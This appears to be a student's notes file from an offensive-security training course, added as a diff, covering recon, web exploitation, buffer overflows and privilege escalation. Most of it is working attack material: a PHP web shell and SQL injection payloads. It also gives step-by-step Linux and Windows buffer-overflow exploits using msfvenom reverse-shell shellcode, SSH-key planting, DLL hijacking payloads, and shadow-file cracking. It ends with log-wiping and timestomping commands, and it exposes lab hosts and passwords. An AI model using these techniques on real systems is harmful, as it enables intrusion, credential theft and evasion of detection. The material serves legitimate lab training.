@@ -1,0 +1,764 @@
+Stack Number 3 	AYKY-003-M (old password: LVqW0fU9stT7rhn)	  10.50.33.69
+					Apollo&Athena (New password)
+
+Linux OpStation: 10.50.32.144 / 192.168.65.20 - Password: Apollo&Athena_2021
+Windows OpStation: 10.50.30.198 / 192.168.65.10 - Password: 
+Jump Box: 10.50.33.69 - Password: Apollo&Athena
+
+64-bit register	lower 32 bits	lower 16 bits
+ping sweep:
+	for i in {1..254} ;do (ping -c 1 10.10.10.$i 2>/dev/null | grep "bytes from" &) ;done
+
+---------------------------------------------------------------------------------------
+### Reconnaisance
+
+	Open Source Intelligence
+		Appropriate Documentation Practices
+		Use of Collected Data
+		Collection Methods
+
+	Web Scraping
+		Look for the <span> or <small> or <div> etc
+		Then find an attribute class=" " or itemprop=" " etc
+
+	Advanced Scanning Techniques
+		Host Discovery
+			Find hosts that are online
+for i in {1..254} ;do (ping -c 1 10.10.10.$i 2>/dev/null | grep "bytes from" &) ;done
+		Port Enumeration
+			Find ports for each host that is online
+		Port Interrogation
+			Find what service is running on each open/available port
+
+	NMAP scripts smb-os-discovery.nse and http-enum.nse
+		proxychains nmap -Pn -T4 -sT -p80,8080 192.168.28.111 --script http-	enum.nse 2>/dev/null
+	
+	SSH Tunneling using sockets
+		ssh -MS /tmp/jump student@10.50.33.69
+		ssh -S /tmp/jump dummy
+		ssh -S /tmp/jump -O forward -D 9050 dummy (dynamic tunnel)
+		ssh -S /tmp/jump -O cancel -D 9050 dummy (closes dynamic tunnel)
+		ssh -S /tmp/jump -O forward -L2222:192.168.28.111:80 DUMB
+		ssh -S /tmp/jump -O forward -L1111:192.168.28.111:8080 DUMB
+			Two tunnels made only needing one tab open for it
+		ssh -S /tmp/jump -O forward -L3333:192.168.28.111:2222 DUMB
+		ssh -MS /tmp/T1 <username>@127.0.0.1 -p3333
+### Vulnerability / Weaponization
+
+	Initial Access
+		Most common method for gaining initial access
+			Phishing Methods
+				Spearphishing - Targeting specific demographic
+				Phishing - Doesn't matter who clicks
+				Whaleing - CEOs or big wig guys
+
+	Introduction to Exploit Research
+		Transition from Recon to Weaponization
+		Leverage intelligence/data about network
+		Pair vulnerabilities to exploits
+		Align Exploits to operational objectives	
+
+	Research
+		Open Sources (Slides or Google)
+		Organizational capabilities
+
+	Capabilities
+		Mission Objective
+			Collection
+			Effects
+		Additional Functionality to fulfill requirements
+		Communications security (COMSEC)
+
+	Testing
+		Exploit Development from vulnerability pairing/mission drivens requirement
+			Test and verify success
+		Testing provides a number of benefits
+			Faster time to breakout of initial foothold
+			Reduced risk of detection and/or tool failure
+			improved recovery times
+
+	Plan
+		Document testing results
+		Testing environment
+
+---------------------------------------------------------------------------------------
+
+### Web Exploitation
+#Day 1
+
+
+HTTP
+	Request/Response
+
+		Various Tools to view:
+
+			TCPDump
+			Wireshark
+			
+	Methods
+
+		GET
+		POST
+		HEAD
+			Transfer Status and Header section
+		PUT
+			Updates
+
+	HTTP Response Codes
+		
+		10X == Informational
+		2XX == Success
+		30X == Redirection
+		4XX == Client Error
+		5XX == Server Error
+
+	HTTP Fields
+		
+		User-Agent - Identifier for web browser
+		Referer - URI of web page that referred the browser to the current request
+		Cookie - A stored cache to save information for users
+		Date - Server timestamp of response
+		Server - A string to identify server software
+		Set-Cookie - Sets a value for browser to remember
+
+
+# Cross Site Scripting
+
+	Insertion of arbitrary code into a webpage, executes in the browser of visitors
+	Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
+	Often found in forums that allow HTML
+	Not persitent, just a proxy
+
+	Reflected XSS
+		Most common form of XSS
+		Transient, occurs in error messages or search results
+		Delivered through intermediate media, such as a link in an email
+		Characters that are normally illegal in URLs can be Base64 encoded
+
+	Stored XSS
+		Resides on vulnerable site
+		Only requires user to visit page	
+
+---------------------------------------------------------------------------------------
+### Demos
+
+	sudo apt install nikto -y
+	nikto -h <ip>
+
+	GET after ?myfile=../../../../../<file>
+	POST inside the website prompt box ../../../../../<file>
+
+	Malicious File Upload
+		open notepad, copy script
+		save as bad.php
+		upload file on <ip>fileUpload.php / uploads (parent directory)
+
+			 <HTML><BODY>
+			 <FORM METHOD="GET" NAME="myform" ACTION="">
+			 <INPUT TYPE="text" NAME="cmd">
+			 <INPUT TYPE="submit" VALUE="Send">
+			 </FORM>
+			 <pre> 
+			 <?php
+			 if($_GET['cmd']) {
+			 system($_GET['cmd']);
+			 }
+			 ?>
+			 </pre>
+			 </BODY></HTML>
+
+	Command Injection
+		<ip>/cmdinjection
+			need a ";" before command ie. ; whoami
+
+	Keygen
+		whoami on the website for username
+		ssh-keygen -t rsa
+		cat /home/student/.ssh/id_rsa.pub
+		ls -la /var/www/.ssh (search for one before you make it)
+		mkdir /var/www/.ssh
+		echo "<key>" >> /var/www/.ssh/authorized_keys
+		cat /var/www/.ssh/authorized_keys
+		ssh www-data@<ip>
+
+--------------------------------------------------------------------------------------
+### Web Exploitation
+# Day 2
+
+	SQL - Structured Query Language - ANSI Standard
+	
+	Standard Commands
+
+		SELECT		Extracts data from a database
+
+		UNION		Used to COMBINE the result-set of 2+ Select Statements
+
+		USE		Selects the DB to use
+
+		UPDATE		Updates data in a database
+
+		DELETE		Deletes data from a database
+
+		INSERT INTO		Inserts new data into a database
+
+		CREATE DATABASE		Creates a new database
+
+		ALTER DATABASE		Modifies a database
+
+		CREATE TABLE		Creates a new table
+
+		ALTER TABLE		Modifies a table
+
+		DROP TABLE		Deletes a table
+
+		CREATE INDEX		Creates an index (search key)
+
+		DROP INDEX		Deletes an index
+
+	SQL Injection - Considerations
+		Requires valid SQL Queries
+		GET Request vs POST request HTTP methods
+
+
+
+
+# SQL Demo
+		
+	Database
+		Information_Schema - Default
+		mysql - Default
+		performance_schema - Default
+		session - CHECK THIS ONE. 
+
+	This is what SQL has to offer
+		Database, Tables, Column, Data
+
+	USE session;
+		SELECT * FROM session.car;
+		show tables;
+		select * from session.Tires UNION select name,type,color,cost from session.cars;			
+
+	'or 1='1 this is the VERY FIRST step for SQL Injection - POST
+
+	@@version gives version number of mySql
+
+	Dev Console network tab --- THIS IS THE ONLY THING YOU CAN DO ON LOGIN PAGE
+		Click on post method after refreshing page
+			request - clcik raw button copy that
+				URL bar add ? after php paste what we copied
+					
+	Step 1 - Find vulnerable area
+		(Word)' or 1=;1
+	Step 2 - Match columns
+		Audi ' UNION SELECT 1,2,3,4,5;#
+			Try till you find one that works increase numbers
+		Find hidden column (one that doesnt show up)
+		Which order are they in
+
+
+### GOLDEN STATEMENT
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
+### Love this thing
+	
+	Change the NUMBERS in THE ORDER THEY APPEAR with the options
+
+Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
+
+Audi' UNION select id,2,name,pass,5 from session.user;#
+Audi' UNION select tireid,2,name,size,cost from session.Tires;#
+
+	If there are multiple columns you can only do however many you have in your table. Multiple queries may be required
+
+IF there is no way to type its a GET method. Drop down, radial button, select all that apply, etc, etc.
+
+	GET method, test method
+		1 OR 1=1;#
+	Match columns
+		2 UNION SELECT 1,2,3;#
+			go until you find table
+			Note what order they are in
+UNION select table_schema,column_name,table_name FROM information_schema.columns where table_schema="session"
+
+UNION select color,cost,year FROM session.car;#
+
+UNION SELECT 1,@@version,3
+
+---------------------------------------------------------------------------------------
+
+### Reverse Engineering
+
+X86_64 Assembly - Memory Offset
+	There are 16 general purpose 64-Bit registers
+		%rax -- the first return register
+		%rbp -- the base pointer that keeps track 
+		%rsp -- the stack pointer that points to the top of the stack
+	You will see arguments passed to functions as something like:
+		%ebp-0x8 -- base pointer (32 bit for e)
+
+	Common Terms
+		Heap
+		Stack
+		General Register
+		Control Register
+		Flags Register
+
+	Common Instruction Pointers
+		
+		Mov - move source to destination
+		Push - push source onto stack
+		Pop - pop top of stack to destination
+		Inc - increment source by 1
+		Dec - decrement source by 1
+		Add - add source to destination
+		Sub - subtract source from destination
+		Cmp - compare two values by substracting them and setting the %RFLAGS 			register. ZeroFlag set means they are the same. 
+		Jmp - Jump to specified location
+		Jle - Jump if less than or equal
+		Je - Jump if equal
+		Jne - Jump if not equal
+		Jz - jump if equal (if folloing a compare statement)
+		Jnz - Jump if not equal
+
+
+###Assembly demo
+	
+Main:
+	mov rax, 16
+	push rax
+	jmp mem2
+
+mem1:
+	mov rax, 0 --- changes value of rax to 0
+	ret
+
+mem2:
+	pop r8 --- pops stack which is equal to 16 into function r8 making it 16
+	cmp rax, r8 --- since both are 16 it equals one
+	je mem1 --- since one it moves to mem1
+
+
+ # Read main function first (make sure to have a main function) 
+
+lea - fancy move (a bit extra)
+
+main:
+	lea rcx, 25 --- moves 25 to rcx making rcx equal 25
+	lea rbx, 62 --- moves 62 to rbx making rbx equal 62
+	jmp mem1
+		
+
+mem1:
+	sub rbx, 40 ----- 62 - 40 makes rbx 22
+	lea rsi, rbx ----- making rsi eqaul the value of rbx (22)
+	cmp rcx, rsi --- (25 = 22) no so it equals 1 
+	jnz mem2 --- since its not 0 it moves to mem2
+	jmp mem3
+
+mem2: 
+	lea rax, 1
+	ret
+
+mem3:
+	lea rax, 0
+	ret
+
+---------------------------------------------------------------------------------------
+
+### Exploit Development
+
+Buffer Overflow Common Terms
+
+	HEAP
+		Memory that can be allocated and deallocated
+	STACK
+		A contiguous section of memory used for passing arguments
+	REGISTERS
+		Storage elements as close as possible to the central processing unit (CPU)
+	INSTRUCTION POINTER (IP)
+		a.k.a Program Counter (PC), contains the address of next instruction to 			be executed
+	STACK POINTER (SP)
+		Contains the address of the next available space on the stack
+	BASE POINTER (BP)
+		The base of the stack
+	FUNCTION
+		Code that is separate from the main program that is often used to replace 			code the repeats in order to make the program smaller and more efficient
+	SHELLCODE
+		The code that is executed once an exploit successfully takes advantage of 			a vulnerability
+
+Buffer Overflow Defenses
+
+	Non executable (NX) stack
+	Address Space Layout Randomization (ASLR)
+	Data Execution Prevention (DEP)
+	Stack Canaries
+	Position Independent Executable (PIE)
+
+Technical Help
+
+	Utilizing tools such as:
+	
+		IDA, GHIDRA -  Reverse Engineering
+		GDB, MONA, IMMUNITY - Exploit Development (GDB Linux) (Immunity Windows)
+		BASH, PYTHON - 
+
+GDB Users
+	
+	git clone https://github.com/longld/peda.git ~/peda
+	echo "source ~/peda/peda.py" >> ~/.gdbinit
+		disass <FUNCTION>
+		info <...>
+		x/256c $<REGISTER>	
+		break <address>
+
+#demo:
+
+Two Ways to interact with a linux executable
+
+	Cat, mv, cp (parameters) 
+		or
+	./function (user-input)
+
+peda is only on my linux opstation, may not install anywhere else
+if its green its a function
+	x86.get.pc.thunk - forget about it
+gets function vulnerable - check for red function and double check online
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+		buffer overflow thingy
+
+use python2 because 3 will not work
+run $(python lin_buff.py)
+
+<<< - tells parameter to run it as USER INPUT
+    - if nothing that means its parameters
+
+1. script take the pattern from wiremask
+	overflow = "pattern"
+2. gdb func - Finding EIP
+	run <<< $(python script)
+3. find EIP - Copy hex
+	copy hex into wiremask register value
+4. Getting offset from wiremask, take into script
+	overflow = "A" * offset
+	eip = "B" * 4 (32 bit value)
+5. gdb func - testing control of EIP
+	run <<< $(python script)
+6. env - gdb func
+	show env
+		lists items
+	unset env (whatever shows up)
+7. Manually overflow 
+	run
+	input a ton of characters
+8. info proc map
+	lists processes
+9. find /b (start of heap),(start of stack),0xff,0xe4
+	find start of heap by finding heap, line below it is the start
+	find start of stack by finding stack, line above it is the start
+	Instruction Pointer is JUMP ESP specified by 0xff(jump) and 0xe4(esp)
+10. Copy like 5-10 lines
+	comment out in scipt for grabbing later just in case error
+11. Make actual eip tester in reverse endian 
+	eip = "\xcf\x44\x55\x66"
+		REVERSE BYTE ORDER not reverse order
+12. NOP sled
+	nop = "\x90" * 10
+	x90 is a constant
+13. Shellcode 
+	msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+	May have to generate shellcode multiple times
+14. paste shellcode into script
+
+15. run it out of gdb as you regularly would. 
+	./func <<< $(python script)
+
+16. verify you are root
+17. change msfvenom to find info. cat /etc/passwd
+	copy shellcode into script
+18. repeat 15
+
+
+Identify if you can exploit
+if it has gdb you are buffer overflowing
+	which gdb
+if it doesnt have gdb you are not buffer overflowing
+	which gdb
+put script in /tmp
+
+YOU NEED TO GET THE ADVERSARY MACHINES EIP AND THEN RUN IT AGAIN ON THEIR MACHINE
+	you still need to run the script to test it on your machine
+
+If you find program buffer overflowable, you have to SCP over to your linops machine
+
+# troubleshooting process
+	double check everything
+	double the nop sled value
+	
+	regenerate new shellcode (first attempt do like 10 times)
+
+	change to the next eip if you run into the shellcode issue (10 or so times)
+	
+	if this all doesnt work, get rekt loser, restart the process from step 1-18
+
+
+
+### Windows Buffer Overflow
+Windows machine:
+	
+	Run SecureServer exe
+	Start immunity debugger
+		file
+			attach the secure server
+	click "play" icon make sure its running
+
+LinOps Machine:
+	
+	Begin script
+		import socket
+		buf = "TRUN/.:/"
+		buf += "A" * 5000
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect(("10.50.30.198",9999))
+		print s.recv(1024)
+		s.send(buf)
+		print s.recv(1024)
+		s.close()
+
+Wiremask generate 5000
+buf += generated 5k instead of ("A" * 5000)
+
+!mona jmp -r esp -m "essfunc.dll"
+
+copy the eip get the offset from wiremask
+
+buf = "A" * offset
+buf = "BBBB" (four bytes because its a 32 bit program specified by the E in EIP)
+
+Back into immunity, run again. (Click rewind button to refresh it all) 
+run script again
+	confirm EIP has changed in immunity debugger
+Go to log data, run mona command
+	find first eip copy it
+		625012A0
+
+place into the buf = "BBBB" in reverse byte order
+	buf = "\xA0\x12\x50\x62"
+
+generating shellcode
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.198 lport=4444 -b 	"\x00" -f python
+		dont copy the first buf = b""
+
+	place a nop sled aswell
+		buf += "\x90" * 10
+
+msfconsole (new tab)
+	use multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost 0.0.0.0
+	set lport 4444
+	run
+	
+then run the script on linops making sure the windows exe is also running to await connection
+
+--------------------------------------------------------------------------------------
+
+### Windows Exploitation
+
+
+	Access Tokens
+		Security Identifier (SID) associations and Token associations
+	Security Descriptors
+		DACL
+		SACL
+		ACEs
+
+	DLL Search Order
+		HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\KnownDLLs
+		The directory the the Application was run from
+		The directory specified in in the C+ function GetSystemDirectory()
+		The directory specified in the C+ function GetWindowsDirectory()
+		The current directory
+	
+	Windows Integrity Mechanism
+		UNTRUSTED --> Anonymous SID access tokens
+		LOW --> Everyone SID access token (World)
+		MEDIUM --> Authenticated Users
+		HIGH --> Administrators
+		*SYSTEM --> System services (LocalSystem, LocalService, NetworkService)*
+
+	User Account Control
+		Always notify
+		Notify me only when programs try to make changes to my computer
+		Never notify
+	Checking UAC Settings:
+		reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+	there are two tokens
+		Admin - used when running as admin
+		User - used for everything else
+	
+	AutoElevate Executables
+		asInvoker - Runs as user signed in
+		highestAvailable - runs as highest available token user signed in has
+ 		 sigcheck -m C:\windows\System32\calc.exe --> example
+ 		 sigcheck -m C:\windows\System32\eventvwr.exe --> example
+			This can be used for priv escalation through programs
+
+#Privilege Escalation
+
+	Scheduled Tasks & Services
+		Write Permissions
+		Non-Standard Locations
+		Unquoted Executable Paths
+		Vulnerabilities in Executables
+		Permissions to Run as SYSTEM
+schtasks /query /fo LIST /v | select-string -pattern "Task To Run" -CaseSensitive | select -string "COM Handler" -NotMatch
+	
+	sigcheck *Path* 
+		getting version numbers	
+	icacls *Path*
+		F - Full access
+		M - Modify
+		RX - Read and execute
+		R - Read only
+		W - Write
+	Open procmon
+		run exe
+		ctrl + L
+			Filters in procmon:
+				Process name contains *exe name*
+				Path contains .dll
+				Result contains NAME NOT FOUND
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\whoami.txt" -f dll > WINMM.dll
+scp WINMM.dll student@10.50.30.198:/C:/users/student/Exercise/
+
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\whoami.txt" -f exe > bad.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > bad.exe
+
+wmic service list full
+
+
+
+	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+		Run
+		RunOnce
+
+	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+		Run
+		RunOnce
+
+	Important Microsoft Event IDs
+		4624/4625 --> Successful/failed login
+		4720 --> Account created
+		4672 --> Administrative user logged on
+		7045 --> Service created
+
+----------------------------------------------------------------------------------------
+
+### Linux Exploitation
+
+	Lateral Escalation
+		You dont lose or gain permissions but there are different things each 		user can access
+
+	Probably dont want user able to sudo cat no read etc/shadow and crack passwords
+		
+	SUID
+		Runs the program as the user created (with their permissions)
+	SGID
+		Runs the program as the group created (with their permissions)
+
+	World-Writable Files and Directories
+		/tmp
+
+	Vulnerable Software and Services
+		We have one on ctfd and we have to figure out what its doing and break it
+
+	Logs for Covering Tracks
+		auth.log/secure  --> Logins/authentications
+
+		lastlog  --> Each users' last successful login time
+		btmp --> Bad login attempts
+		sulog --> Usage of SU command
+		utmp --> Currently logged in users (W command)
+		wtmp --> Permanent record on user on/off
+	
+	Reading Files or Logs
+		cat /var/log/auth.log | egrep -v "opened|closed"
+		awk '/opened/' /var/log/auth.log
+		last OR lastb OR lastlog
+		strings OR dd            # for data files
+		more /var/log/syslog
+		head/tail
+
+	Cleaning the Logs
+		rm -rf /var/log
+		cat /dev/null > /var/log
+		echo > /var/log
+
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+	
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+
+	Timestomp
+		touch -c -t 201603051015 1.txt
+		touch -r 3.txt 1.txt
+
+	Check config file of rsyslog
+		/etc/rsyslog.d/*
+		/etc/rsyslog.conf`
+		grep "IncludeConfig" /etc/rsyslog.conf
+
+		IF COMMENTED OUT DOES NOT MATTER
+
+# DEMO
+
+	whoami && hostname
+	sudo -l
+	GTFOBins(website) - find command you have sudo access
+		change /bin/sh to /bin/bash
+	find / -type f -perm /2000 2>/dev/null -- 4000(SUID) and 6000-BOTH SUID AND GUID
+		put the NAME of the thing not full path into GTFOBins
+	
+	Dot path (YOU WILL NOT CHANGE THE PATH YOURSELF)
+		inside of a vim or bash script		
+			cat /etc/passwd > dagoodz.txt
+			/bin/ls -latr > something.txt
+
+	John The Ripper password cracking
+	
+		If we see Zeus it is the box we wanna crack
+		cat /etc/shadow
+		sudo apt install john
+		john --wordlist=password.txt shadow.txt
+		ANY PASSWORD YOU GET WRITE IT DOWN
+		john shadow.txt --show	
+	
+	sudoing files	
+		sudo vim /etc/sudoers
+		
+	Logging
+
+		sudo tail -n50 /var/log/auth.log
+			timestamp and pid analysis
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
